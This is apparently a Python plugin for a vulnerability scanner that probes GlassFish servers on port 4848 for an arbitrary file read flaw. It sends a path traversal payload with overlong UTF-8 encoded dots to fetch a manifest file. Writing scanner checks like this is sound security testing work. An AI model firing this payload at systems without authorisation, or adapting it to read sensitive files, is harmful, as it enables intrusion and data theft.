#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Reference: https://github.com/ydhcui/Scanver/blob/master/payloads/glassfish.py

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'glassfish_file_read'
        self.info = "Check the Glassfish arbitrary file read vuln"
        self.keyword = ['all', 'glassfish', 'file_read', 'web', '4848']
        self.default_ports_list = [4848,]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        poc = "theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF"
        urls = []
        urls.append("http://%s:%d/%s"%(ip, port, poc)) if add_web_path == "" else urls.append("http://%s:%d/%s/%s"%(ip, port, add_web_path, poc))
        urls.append("https://%s:%d/%s"%(ip, port, poc)) if add_web_path == "" else urls.append("https://%s:%d/%s/%s"%(ip, port, add_web_path, poc))
        for url in urls:
            try:
                req = Requester(url)
                if 'Version' in req.html:
                    result = "exits the Glassfish arbitrary file read vuln"
                    self._output(ip, port, result)
                    return
            except:
                pass

globals()['VulnChecker'] = VulnChecker